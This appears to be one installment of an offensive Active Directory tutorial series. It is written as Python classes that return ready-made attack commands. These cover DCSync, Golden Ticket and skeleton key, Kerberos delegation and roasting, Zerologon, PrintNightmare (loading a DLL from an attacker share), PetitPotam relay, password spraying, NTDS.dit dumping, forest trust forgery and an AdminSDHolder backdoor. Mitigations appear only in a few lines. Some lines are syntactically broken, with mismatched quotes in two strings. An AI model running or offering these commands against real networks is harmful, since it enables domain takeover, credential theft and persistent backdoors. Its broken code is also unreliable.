# Part 75: Active Directory Advanced Attacks (Steps 741-750)

## Step 741: ACL/ACE Abuse

```python
#!/usr/bin/env python3
# Active Directory ACL/ACE abuse

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ACLAbuse:
    """AD ACL/ACE abuse for privilege escalation"""
    
    # High-value ACEs to look for in BloodHound
    ABUSABLE_RIGHTS = [
        "GenericAll",         # Full control over object
        "GenericWrite",       # Write any attribute
        "WriteOwner",         # Change object owner
        "WriteDACL",          # Modify ACL
        "AllExtendedRights",  # Includes ForceChangePassword
        "ForceChangePassword", # Change password without knowing old one
        "AddMember",          # Add members to groups
        "Owns",               # Object owner
        "DCSync",             # GetChangesAll on domain
    ]
    
    def genericall_abuse(self, target: str, attacker: str) -> Dict:
        """Abuse GenericAll right over user/group/computer"""
        commands = {
            "user_password_change": [
                f'net user {target} NewPass123! /domain',
                f'powershell "$s=New-Object System.Security.SecureString; \"NewPass123!\".ToCharArray() | ForEach-Object {{$s.AppendChar($_)}}; Set-ADAccountPassword -Identity {target} -NewPassword $s"',
                f'python3 changepasswd.py {target}:NewPass@domain.com',
            ],
            "group_add_member": [
                f'Add-ADGroupMember -Identity "{target}" -Members "{attacker}"',
                f'net group "{target}" "{attacker}" /add /domain',
            ],
            "computer_rbcd": [
                f'# Resource-Based Constrained Delegation abuse',
                f'python3 rbcd.py -action write -delegate-from attacker-computer -delegate-to {target} domain.com/attacker:pass',
            ]
        }
        return {"right": "GenericAll", "commands": commands}
    
    def genericwrite_abuse(self, target: str) -> Dict:
        """Abuse GenericWrite right"""
        return {
            "right": "GenericWrite",
            "shadow_credentials": [
                f'python3 pywhisker.py -d domain.com -u attacker -p pass --target {target} --action add',
                f'# Get TGT using PKINIT after adding shadow credential',
                f'python3 gettgtpkinit.py domain.com/{target} output.ccache -cert-pfx cert.pfx',
            ],
            "targeted_kerberoasting": [
                f'# Set SPN on user to enable Kerberoasting',
                f'Set-ADUser {target} -ServicePrincipalNames @{{Add="fakeSPN/fake"}}',
                f'python3 GetUserSPNs.py domain.com/attacker:pass -request-user {target}',
            ],
            "logon_script": [
                f'Set-ADUser -Identity {target} -ScriptPath "\\\\dc\\sysvol\\domain\\scripts\\evil.bat"'
            ]
        }
    
    def writeowner_writedacl_abuse(self, target: str, attacker: str) -> Dict:
        """Abuse WriteOwner and WriteDACL"""
        return {
            "writeowner_steps": [
                f'$owner = New-Object System.Security.Principal.SecurityIdentifier("{attacker}-SID")',
                f'$acl = Get-Acl "AD:CN={target},DC=domain,DC=com"',
                f'$acl.SetOwner($owner)',
                f'Set-Acl -AclObject $acl "AD:CN={target},DC=domain,DC=com"',
                f'# Now add WriteDACL to grant GenericAll',
            ],
            "writedacl_steps": [
                f'Add-DomainObjectAcl -TargetIdentity {target} -PrincipalIdentity {attacker} -Rights All',
                f'# PowerView command to grant GenericAll',
                f'# Then reset to avoid detection',
            ],
            "powermad_abuse": [
                f'# If you can add computer accounts (MachineAccountQuota > 0)',
                f'New-MachineAccount -MachineAccount FakeComputer -Password (ConvertTo-SecureString "FakePass" -AsPlainText -Force)',
                f'# Then set RBCD from FakeComputer to target',
            ]
        }
    
    def dcsync_attack(self, domain: str, target_user: str = "krbtgt") -> Dict:
        """DCSync attack for credential extraction"""
        commands = [
            f'python3 secretsdump.py -just-dc-user {target_user} {domain}/DCSync_user:pass@dc.{domain}',
            f'python3 secretsdump.py -just-dc {domain}/DCSync_user:pass@dc.{domain}',
            f'mimikatz "lsadump::dcsync /domain:{domain} /user:{target_user}" exit',
            f'mimikatz "lsadump::dcsync /domain:{domain} /all" exit',
        ]
        required_rights = ["GetChanges", "GetChangesAll", "GetChangesInFilteredSet"]
        return {
            "technique": "DCSync",
            "required_rights": required_rights,
            "commands": commands,
            "who_has_dcsync": [
                "Domain Admins", "Domain Controllers",
                "Enterprise Admins", "Anyone granted GetChangesAll"
            ]
        }


@dataclass
class ADPersistence:
    """Active Directory persistence techniques"""
    
    def golden_ticket(self, krbtgt_hash: str, domain: str, domain_sid: str) -> Dict:
        """Create Golden Ticket for persistent DA access"""
        commands = [
            f'mimikatz "kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /ptt" exit',
            f'python3 ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} Administrator',
            f'export KRB5CCNAME=/tmp/administrator.ccache',
            f'python3 psexec.py -k -no-pass {domain}/Administrator@dc.{domain}',
        ]
        return {
            "technique": "Golden Ticket",
            "commands": commands,
            "persistence": "Valid until krbtgt password changes (occurs every 180 days by default)"
        }
    
    def skeleton_key(self) -> Dict:
        """Skeleton key attack - master password for domain"""
        return {
            "commands": [
                'mimikatz "privilege::debug" "misc::skeleton" exit',
                '# After: any user can authenticate with password "mimikatz"',
            ],
            "detection": "Event ID 4673 (sensitive privilege use), Lsass modifications",
            "cleanup": "Reboot domain controller (not persistent across reboots)"
        }
    
    def dsrm_backdoor(self) -> Dict:
        """DSRM (Directory Services Restore Mode) backdoor"""
        return {
            "commands": [
                '# Set DSRM password to known value',
                'ntdsutil "set dsrm password" "reset password on server null" q q',
                '# Enable DSRM network logon',
                'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2',
                '# Login as .\\.\\Administrator with DSRM password',
                'mimikatz "privilege::debug" "token::elevate" "lsadump::sam" exit',
            ],
            "description": "DSRM admin is a local admin on DC, enabled with registry key"
        }


if __name__ == '__main__':
    acl = ACLAbuse()
    print(f"[+] Abusable AD rights: {len(acl.ABUSABLE_RIGHTS)}")
    for right in acl.ABUSABLE_RIGHTS:
        print(f"    {right}")
    
    dcsync = acl.dcsync_attack("contoso.com", "krbtgt")
    print(f"\n[+] DCSync commands: {len(dcsync['commands'])}")
    print(f"    {dcsync['commands'][0][:80]}...")
    
    persist = ADPersistence()
    golden = persist.golden_ticket("krbtgt_nt_hash", "contoso.com", "S-1-5-21-...")
    print(f"\n[+] Golden Ticket commands: {len(golden['commands'])}")
```

## Step 742: Kerberos Delegation Attacks

```python
#!/usr/bin/env python3
# Kerberos delegation attack techniques

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class KerberosDelegationAttacks:
    """Kerberos delegation attack techniques"""
    
    def unconstrained_delegation_abuse(self, domain: str, dc_ip: str) -> Dict:
        """Abuse unconstrained delegation for privilege escalation"""
        commands = {
            "find_unconstrained": [
                'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties *',
                'python3 findDelegation.py domain.com/user:pass',
                'ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w pass -b "DC=domain,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"',
            ],
            "printer_bug_exploitation": [
                '# Force DC to authenticate to unconstrained delegation server',
                f'python3 printerbug.py {domain}/user:pass@{dc_ip} UNCONSTRAINED-SERVER',
                '# Capture TGT on unconstrained server',
                'Rubeus.exe monitor /interval:5 /nowrap',
                '# Pass the ticket',
                'Rubeus.exe ptt /ticket:BASE64_TGT',
            ],
            "pass_the_ticket": [
                '# Import captured TGT',
                'mimikatz "kerberos::ptt ticket.kirbi" exit',
                'Rubeus.exe ptt /ticket:ticket.kirbi',
                'export KRB5CCNAME=/tmp/ticket.ccache',
            ]
        }
        return {"technique": "Unconstrained Delegation", "commands": commands}
    
    def constrained_delegation_abuse(self, service_account: str, target: str, domain: str) -> Dict:
        """Abuse constrained delegation S4U2Proxy"""
        commands = {
            "using_rubeus": [
                f'Rubeus.exe s4u /user:{service_account} /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/{target} /ptt',
                f'Rubeus.exe s4u /user:{service_account} /aes256:HASH /impersonateuser:Administrator /msdsspn:http/{target} /altservice:cifs /ptt',
            ],
            "using_impacket": [
                f'python3 getST.py -spn cifs/{target} -impersonate Administrator {domain}/{service_account}:pass',
                f'export KRB5CCNAME=/tmp/Administrator.ccache',
                f'python3 smbclient.py -k -no-pass {domain}/Administrator@{target}',
            ]
        }
        return {"technique": "Constrained Delegation", "commands": commands}
    
    def rbcd_attack(self, attacker_machine: str, target_computer: str, domain: str) -> Dict:
        """Resource-Based Constrained Delegation attack"""
        steps = [
            f"1. Have GenericWrite/GenericAll on target computer",
            f"2. Have or create a computer account (attacker machine)",
            f"3. Set RBCD: modify msDS-AllowedToActOnBehalfOfOtherIdentity",
            f"4. Use S4U2Self+S4U2Proxy to impersonate DA",
        ]
        
        commands = {
            "set_rbcd": [
                f'python3 rbcd.py -action write -delegate-from {attacker_machine} -delegate-to {target_computer} {domain}/user:pass',
                f'Set-ADComputer {target_computer} -PrincipalsAllowedToDelegateToAccount (Get-ADComputer {attacker_machine})',
            ],
            "exploit": [
                f'python3 getST.py -spn cifs/{target_computer} -impersonate Administrator {domain}/{attacker_machine}$:pass',
                f'export KRB5CCNAME=Administrator.ccache',
                f'python3 wmiexec.py -k -no-pass {domain}/Administrator@{target_computer}',
            ]
        }
        return {"technique": "RBCD", "steps": steps, "commands": commands}


@dataclass
class KerberosRoasting:
    """Kerberos roasting techniques"""
    
    def kerberoasting_attack(self, domain: str, username: str, password: str) -> Dict:
        """Kerberoasting - request and crack service tickets"""
        return {
            "enumerate_spns": [
                f'python3 GetUserSPNs.py {domain}/{username}:{password} -dc-ip dc-ip -outputfile kerberoast.txt',
                'Get-DomainUser -SPN | Select-Object SAMAccountName,ServicePrincipalName',
                'ldapsearch -x -H ldap://dc -D "user@domain" -w pass -b "DC=domain,DC=com" "(servicePrincipalName=*)"',
            ],
            "request_tickets": [
                f'python3 GetUserSPNs.py {domain}/{username}:{password} -request -outputfile hashes.txt',
                'Rubeus.exe kerberoast /outfile:hashes.txt /nowrap',
            ],
            "crack": [
                'hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt',
                'john --wordlist=rockyou.txt --format=krb5tgs hashes.txt',
            ],
            "mitigation": [
                "Use long random passwords for service accounts (gMSA)",
                "Use AES encryption (not RC4) for Kerberos",
                "Monitor Event ID 4769 (Kerberos ticket requested) for unusual SPNs",
            ]
        }
    
    def asrep_roasting(self, domain: str, users_file: str) -> Dict:
        """ASREPRoasting - get tickets for accounts without preauth"""
        return {
            "find_vulnerable": [
                f'python3 GetNPUsers.py {domain}/ -usersfile {users_file} -dc-host dc.{domain} -no-pass',
                'Get-DomainUser -PreauthNotRequired | Select-Object SAMAccountName',
            ],
            "crack": [
                'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt',
                'john --wordlist=rockyou.txt --format=krb5asrep asrep_hashes.txt',
            ],
            "mitigation": "Require preauthentication for all accounts (default)"
        }


if __name__ == '__main__':
    deleg = KerberosDelegationAttacks()
    
    unconstrained = deleg.unconstrained_delegation_abuse("contoso.com", "192.168.1.10")
    print(f"[+] Unconstrained delegation printer bug steps:")
    for cmd in unconstrained['commands']['printer_bug_exploitation']:
        print(f"    {cmd}")
    
    rbcd = deleg.rbcd_attack("attacker-pc$", "target-server$", "contoso.com")
    print(f"\n[+] RBCD steps:")
    for step in rbcd['steps']:
        print(f"    {step}")
    
    roasting = KerberosRoasting()
    kerberoast = roasting.kerberoasting_attack("contoso.com", "user", "pass")
    print(f"\n[+] Kerberoasting command: {kerberoast['request_tickets'][0][:80]}...")
```

## Step 743: Domain Privilege Escalation

```python
#!/usr/bin/env python3
# Domain privilege escalation techniques

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class DomainPrivEsc:
    """Domain privilege escalation"""
    
    def zerologon_cve_2020_1472(self, dc_hostname: str, dc_ip: str) -> Dict:
        """Zerologon CVE-2020-1472 exploitation"""
        return {
            "description": "Exploit Netlogon to gain DA by setting DC computer account password to empty",
            "check": f'python3 zerologon_tester.py {dc_hostname} {dc_ip}',
            "exploit": [
                f'python3 cve-2020-1472-exploit.py {dc_hostname} {dc_ip}',
                f'# After exploit: DC machine account has empty password',
                f'python3 secretsdump.py -just-dc {dc_hostname}$@{dc_ip} -no-pass',
                f'# Get DA hash, restore DC account password',
                f'python3 reinstall_original_pw.py {dc_hostname} {dc_ip} <hex_password>',
            ],
            "impact": "Complete domain takeover",
            "patch": "KB4571694 (August 2020)"
        }
    
    def print_spooler_attacks(self) -> Dict:
        """PrintNightmare CVE-2021-1675"""
        return {
            "description": "RCE/LPE via Windows Print Spooler",
            "local_privesc": [
                'python3 CVE-2021-1675.py local 127.0.0.1 "C:\\Windows\\Temp\\malicious.dll"',
            ],
            "remote_rce": [
                'python3 CVE-2021-1675.py domain/user:pass@192.168.1.10 \'\\\\attacker\\share\\malicious.dll\'',
            ],
            "impacket": [
                'python3 printnightmare.py domain/user:pass@dc-ip \'\\\\attacker\\share\\malicious.dll\'',
            ],
            "patch": "KB5004945 (July 2021)"
        }
    
    def petitpotam_attack(self, listener: str, target: str) -> Dict:
        """PetitPotam - force NTLM auth from DC"""
        return {
            "description": "Force DC to authenticate to attacker via EFS/LSARPC",
            "setup_ntlm_relay": [
                f'python3 ntlmrelayx.py -smb2support --adcs --template DomainController -t ldap://dc.domain.com',
            ],
            "trigger": [
                f'python3 PetitPotam.py -d domain.com -u user -p pass {listener} {target}',
                f'python3 PetitPotam.py {listener} {target}  # Unauthenticated (older)",
            ],
            "exploit_captured_cert": [
                f'python3 gettgtpkinit.py domain.com/DC$ /tmp/dc.ccache -pfx-base64 BASE64_PFX',
                f'export KRB5CCNAME=/tmp/dc.ccache',
                f'python3 secretsdump.py -k -no-pass domain.com/DC$@dc.domain.com',
            ]
        }
    
    def bloodhound_paths(self) -> Dict:
        """Common BloodHound attack paths"""
        paths = [
            {
                "path": "Current User -> HelpDesk Group -> Domain Admins",
                "attack": "GenericAll on group + group has AdminTo on DA"
            },
            {
                "path": "Current User -> WriteDACL -> Domain",
                "attack": "Grant DCSync rights to current user"
            },
            {
                "path": "Computer -> Constrained Delegation -> DC",
                "attack": "S4U2Proxy impersonate Domain Admin"
            },
        ]
        
        bloodhound_queries = {
            "find_path_to_DA": 'MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p',
            "find_all_da_paths": 'MATCH (n)-[:MemberOf*1..]->(g:Group) WHERE g.name =~ "(?i)domain admins.*" RETURN n',
            "find_dcsync": 'MATCH (n)-[r:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n',
            "find_local_admin": 'MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c',
        }
        
        return {"attack_paths": paths, "cypher_queries": bloodhound_queries}


if __name__ == '__main__':
    priv_esc = DomainPrivEsc()
    
    zerologon = priv_esc.zerologon_cve_2020_1472("DC01", "192.168.1.10")
    print(f"[+] Zerologon steps: {len(zerologon['exploit'])}")
    print(f"    Impact: {zerologon['impact']}")
    
    bloodhound = priv_esc.bloodhound_paths()
    print(f"\n[+] Attack paths: {len(bloodhound['attack_paths'])}")
    print(f"[+] BloodHound queries: {list(bloodhound['cypher_queries'].keys())}")
```

## Step 744: Password Spraying & Credential Harvesting

```python
#!/usr/bin/env python3
# AD password spraying and credential harvesting

import time
import ldap3
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class PasswordSpraying:
    """Active Directory password spraying"""
    domain: str
    dc_ip: str
    
    # Common weak passwords
    SPRAY_PASSWORDS = [
        "Welcome1!", "Password1!", "Company2024!",
        "Passw0rd", "Summer2024!", "Winter2024!",
        "January2024!", "Welcome123", "P@ssw0rd",
    ]
    
    def ldap_password_spray(self, users: List[str], password: str) -> List[str]:
        """Spray single password against user list via LDAP"""
        valid_creds = []
        server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
        
        for user in users:
            try:
                conn = ldap3.Connection(
                    server,
                    user=f"{self.domain}\\{user}",
                    password=password,
                    authentication=ldap3.NTLM
                )
                if conn.bind():
                    print(f"[!] Valid: {user}:{password}")
                    valid_creds.append(f"{user}:{password}")
                    conn.unbind()
            except Exception as e:
                if "ACCOUNT_LOCKED" in str(e):
                    print(f"[!] Account locked: {user}")
                elif "passwordExpired" in str(e):
                    print(f"[!] Password expired: {user}")
        
        return valid_creds
    
    def spray_with_lockout_check(self, users: List[str], password: str, 
                                   delay_minutes: int = 30) -> Dict:
        """Safe spraying with lockout threshold awareness"""
        # Check lockout policy first
        policy_cmds = [
            f'net accounts /domain',
            f'Get-ADDefaultDomainPasswordPolicy -Server {self.dc_ip}',
            f'crackmapexec ldap {self.dc_ip} -u user -p pass --pass-pol',
        ]
        
        spray_tool_cmds = [
            f'python3 spray.py -smb {self.dc_ip} users.txt {password} 1 {delay_minutes} {self.domain}',
            f'crackmapexec smb {self.dc_ip} -u users.txt -p {password} --no-bruteforce --continue-on-success',
            f'kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} users.txt {password}',
        ]
        
        return {
            "policy_check": policy_cmds,
            "spray_commands": spray_tool_cmds,
            "safe_threshold": f"Spray once per {delay_minutes} minutes (below lockout threshold)"
        }
    
    def o365_spray(self, email_list: str) -> Dict:
        """Microsoft 365 / Azure AD password spraying"""
        return {
            "tool": "o365spray / ruler / TeamFiltration",
            "commands": [
                f'python3 o365spray.py --spray --userfile {email_list} --password Welcome1! --count 1 --lockout 1',
                f'ruler --domain contoso.com spray --users {email_list} --passwords passwords.txt --delay 60 --verbose',
            ],
            "endpoints": [
                "https://login.microsoft.com/common/oauth2/token",
                "https://outlook.office365.com/EWS/Exchange.asmx",
                "https://login.microsoftonline.com/",
            ]
        }


@dataclass
class CredentialHarvesting:
    """Credential harvesting techniques"""
    
    def group_policy_preferences_creds(self) -> Dict:
        """Extract creds from Group Policy Preferences"""
        return {
            "description": "GPP stored encrypted passwords in SYSVOL (AES key leaked by Microsoft)",
            "commands": [
                f'python3 Get-GPPPassword.py domain.com/user:pass@dc.domain.com',
                f'crackmapexec smb dc-ip -u user -p pass -M gpp_password',
                f'findstr /SI password .\\*.xml  # Look in SYSVOL manually',
            ],
            "decrypt_manually": [
                'python3 -c "from impacket.dpapi import AES_KEY; AES_KEY = bytes.fromhex(\'4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\'); ..."',
            ]
        }
    
    def laps_credentials(self) -> Dict:
        """Extract LAPS (Local Administrator Password Solution) credentials"""
        return {
            "description": "Read ms-Mcs-AdmPwd attribute if you have read rights",
            "commands": [
                'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Where-Object {$_."ms-Mcs-AdmPwd" -ne $null} | Select-Object Name,ms-Mcs-AdmPwd',
                'python3 lapsreader.py -l dc.domain.com -u user -p pass -d domain.com',
                'crackmapexec ldap dc-ip -u user -p pass -M laps',
            ]
        }
    
    def ntds_extraction(self, dc_ip: str, domain: str) -> Dict:
        """Extract NTDS.dit database"""
        return {
            "methods": [
                {
                    "name": "Volume Shadow Copy",
                    "commands": [
                        'vssadmin create shadow /for=C:',
                        'copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit" C:\\',
                        'reg save HKLM\\SYSTEM C:\\system.hive',
                        f'python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL',
                    ]
                },
                {
                    "name": "Remote secretsdump",
                    "commands": [
                        f'python3 secretsdump.py -just-dc domain.com/DomainAdmin:pass@{dc_ip}',
                        f'python3 secretsdump.py -just-dc-ntlm domain.com/DomainAdmin:pass@{dc_ip}',
                    ]
                }
            ]
        }


if __name__ == '__main__':
    spray = PasswordSpraying("contoso.com", "192.168.1.10")
    print(f"[+] Password spray wordlist ({len(spray.SPRAY_PASSWORDS)} passwords):")
    for p in spray.SPRAY_PASSWORDS:
        print(f"    {p}")
    
    spray_result = spray.spray_with_lockout_check(["user1", "user2"], "Welcome1!")
    print(f"\n[+] Spray commands: {spray_result['spray_commands'][0][:70]}...")
    
    harvesting = CredentialHarvesting()
    ntds = harvesting.ntds_extraction("192.168.1.10", "contoso.com")
    print(f"\n[+] NTDS extraction methods: {len(ntds['methods'])}")
```

## Step 745-750: Additional AD Attack Techniques

```python
#!/usr/bin/env python3
# Additional AD attack scenarios (Steps 745-750)

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ADForestAttacks:
    """Cross-forest and trust attacks"""
    
    def trust_ticket_attack(self, parent_domain: str, child_domain: str,
                             trust_key: str, domain_sid: str, parent_sid: str) -> Dict:
        """Forge inter-domain trust ticket (ExtraSids attack)"""
        return {
            "description": "Compromise child domain to get forest-wide access",
            "mimikatz": [
                f'mimikatz "kerberos::golden /user:Administrator /domain:{child_domain} /sid:{domain_sid} /sids:{parent_sid}-519 /krbtgt:{trust_key} /service:krbtgt /target:{parent_domain} /ptt" exit',
            ],
            "impacket": [
                f'python3 ticketer.py -nthash {trust_key} -domain-sid {domain_sid} -domain {child_domain} -extra-sid {parent_sid}-519 Administrator',
                f'export KRB5CCNAME=Administrator.ccache',
                f'python3 psexec.py -k -no-pass {parent_domain}/Administrator@DC.{parent_domain}',
            ]
        }
    
    def sid_history_attack(self) -> Dict:
        """SID History injection for persistence"""
        return {
            "add_sid_history": [
                'Add-ADGroupMember -Identity "Domain Admins" -Members user  # If you have rights',
                '# via mimikatz (requires DA in child domain)',
                'mimikatz "privilege::debug" "sid::patch" "sid::add /sam:user /new:S-1-5-21-FOREST-ROOT-SID-519" exit',
            ],
            "description": "Add Enterprise Admins SID to user's SID history for forest access"
        }

@dataclass
class ADReconTools:
    """AD enumeration and recon tools"""
    
    def bloodhound_collection(self, domain: str, dc_ip: str) -> Dict:
        """BloodHound data collection"""
        return {
            "sharphound_ps": [
                'Invoke-BloodHound -CollectionMethod All -Domain {domain} -ZipFileName bloodhound.zip',
                'Invoke-BloodHound -CollectionMethod DCOnly',
                'Invoke-BloodHound -CollectionMethod LoggedOn',
            ],
            "bloodhound_py": [
                f'python3 bloodhound.py -d {domain} -u user -p pass -ns {dc_ip} -c all',
                f'python3 bloodhound.py -d {domain} -u user -p pass -ns {dc_ip} -c DCOnly',
            ],
            "upload_and_analyze": [
                'Start neo4j console',
                'Open http://localhost:7474',
                'Upload zip to BloodHound',
                'Run pre-built analysis queries',
            ]
        }
    
    def ad_recon_commands(self) -> Dict:
        """Built-in AD reconnaissance commands"""
        return {
            "users": [
                'Get-ADUser -Filter * -Properties *',
                'net user /domain',
                'ldapsearch -x -H ldap://dc -D "user@domain" -w pass -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName',
            ],
            "groups": [
                'Get-ADGroup -Filter * -Properties *',
                'Get-ADGroupMember "Domain Admins" -Recursive',
                'net group /domain',
            ],
            "gpos": [
                'Get-GPO -All',
                'Get-GPOReport -All -ReportType HTML -Path C:\\gpo_report.html',
            ],
            "trusts": [
                'Get-ADTrust -Filter *',
                '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()',
                'nltest /domain_trusts',
            ]
        }

@dataclass
class AdminSDHolderAbuse:
    """AdminSDHolder persistence technique"""
    
    def adminsdholder_backdoor(self, attacker_user: str) -> Dict:
        """Add ACE to AdminSDHolder for persistent DA access"""
        return {
            "description": "AdminSDHolder template applied to all protected groups every 60 minutes",
            "add_ace": [
                f'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity {attacker_user} -Rights All',
                f'# After 60 min (or force): attacker has GenericAll on DA group',
                f'# Force SDProp:",
                f'Invoke-SDPropagator -showProgress -timeoutMinutes 1',
            ],
            "immediate": [
                'repadmin /syncall /force /e /d  # Force replication',
                'Invoke-Expression (Get-Content SDPropExecForce.ps1 -Raw)',
            ]
        }


if __name__ == '__main__':
    forest = ADForestAttacks()
    trust_attack = forest.trust_ticket_attack(
        "parent.com", "child.parent.com",
        "trust_key_here", "S-1-5-21-CHILD-SID", "S-1-5-21-PARENT-SID"
    )
    print(f"[+] Trust ticket attack steps:")
    for cmd in trust_attack['impacket']:
        print(f"    {cmd}")
    
    recon = ADReconTools()
    bloodhound = recon.bloodhound_collection("contoso.com", "192.168.1.10")
    print(f"\n[+] BloodHound collection options: {list(bloodhound.keys())}")
    
    adminsdholder = AdminSDHolderAbuse()
    backdoor = adminsdholder.adminsdholder_backdoor("attacker_user")
    print(f"\n[+] AdminSDHolder backdoor: {backdoor['description']}")
```
